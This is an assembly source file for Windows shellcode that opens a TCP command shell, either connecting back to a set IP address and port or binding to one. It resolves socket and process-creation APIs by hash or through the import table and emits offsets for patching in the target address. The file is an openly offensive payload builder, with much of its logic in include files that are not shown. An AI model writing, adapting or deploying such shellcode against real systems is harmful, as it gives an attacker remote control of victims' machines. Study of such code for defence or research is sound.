; *********************************************************************
;
;   Copyright (C) 2014 Kevin Devine - @cmpxchg8
;
;   This program is free software: you can redistribute it and/or modify
;   it under the terms of the GNU General Public License as published by
;   the Free Software Foundation, either version 3 of the License, or
;   (at your option) any later version.
;
;   This program is distributed in the hope that it will be useful,
;   but WITHOUT ANY WARRANTY; without even the implied warranty of
;   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;   GNU General Public License for more details.
;
;   You should have received a copy of the GNU General Public License
;   along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
; *********************************************************************
ifndef __JWASM__
  .err <JWASM IS REQUIRED>
endif

  ;USE_IAT  equ 1   ; use import address table to resolve API, default is export
  ;USE_BIND equ 1   ; bind to host, default is reverse connect
  USE_X86  equ 1   ; generate 32-bit code
  ;USE_CRC  equ 1   ; use INTEL crc32 instruction
  
ifdef USE_X86
  .686
  .xmm
  .model flat, stdcall
  option fieldalign:4
else
  .x64
  .model flat, fastcall
  option fieldalign:8
endif
  
  include incs/useful.inc
  include incs/struc.inc
  
  %echo
  %echo // Generated on @Date at @Time
  %echo
  %echo // Description     : @CatStr(%CPU_MODE)-Bit @CatStr(%TCP_MODE) shell using @CatStr(%IMPORT_MODE) Address Table
  %echo // TCP Address     : @CatStr(%TCP_ADDR):@CatStr(%PORT)
  %echo // Hash algorithm  : @CatStr(%HASH_ALGO) 
  
  .code
  
  public revbind
  public _revbind
  
revbind:
_revbind:

ifdef MAKE_EXE
    includelib kernel32.lib

    call   prep_code

  ifdef USE_X86
    push   eax
  else
    xor    ecx, ecx
  endif
    call   ExitProcess
endif

ifdef USE_X86
  prep_code proc
      pushad
else
  prep_code proc uses rbx rsi rdi rbp r12 r13 r14 r15
endif
      jmp    init
  geip:
ifdef USE_X86
      pop    esi
else
      pop    rsi
endif
      xor    eax, eax
      cdq
      mov    dl, (connection - api_tbl) and 255
      mov    dh, (connection - api_tbl) shr 8
ifdef USE_X86
      add    edx, esi
      call   edx
      popad
else
      add    rdx, rsi
      call   rdx
endif
      ret
init:
      call   geip
  prep_code endp

    api_tbl label dword
    
ifdef USE_IAT
    STRING "kernel32"
    
    ; kernel32 API
    db 4                         ; number to resolve
    
    STRING "LoadLibraryA"
    STRING "CreateProcessA"
    STRING "WaitForSingleObject"
    STRING "CloseHandle"
    
    STRING "ws2_32"
    
    ; ws2_32 API
  ifdef USE_BIND
    db 6
  else
    db 4
  endif
    STRING "WSAStartup"
    STRING "WSASocketA"
    
  ifdef USE_BIND
    STRING "bind"
    STRING "listen"
    STRING "accept"
  else
    STRING "connect"
  endif
    STRING "closesocket"
else

    k32_tbl label dword
    
    db (ws32_tbl - k32_tbl) / sizeof (dword)
    
    dd API_HASH ("LoadLibraryA")
    dd API_HASH ("CreateProcessA")
    dd API_HASH ("WaitForSingleObject")
    dd API_HASH ("CloseHandle")
    
    ws32_tbl label dword
    
    db (ws32_end - ws32_tbl) / sizeof (dword)
    
    dd API_HASH ("WSAStartup")
    dd API_HASH ("WSASocketA")
    
  ifdef USE_BIND
    dd API_HASH ("bind")
    dd API_HASH ("listen")
    dd API_HASH ("accept")
  else
    dd API_HASH ("connect")
  endif
    dd API_HASH ("closesocket")

    ws32_end label dword
endif
    api_tbl_end label dword

    include incs/getapi.inc
    include incs/resolve.inc
    include incs/cmd.inc
    include incs/connection.inc

revbind_end label dword

    %echo // Code size       : @CatStr(%offset revbind_end - offset revbind) bytes
    %echo
    .radix 16
    %echo #define API_DATA @CatStr(0x)@CatStr(%offset api_tbl - offset revbind)  // offset to API/DLL
    %echo #define PORT_NBR @CatStr(0x)@CatStr(%offset port_nbr - offset revbind) // offset to port number
    %echo #define IP_ADDR  @CatStr(0x)@CatStr(%offset ip_address - offset revbind) // offset to IP address
    .radix 10
    %echo
    
    end
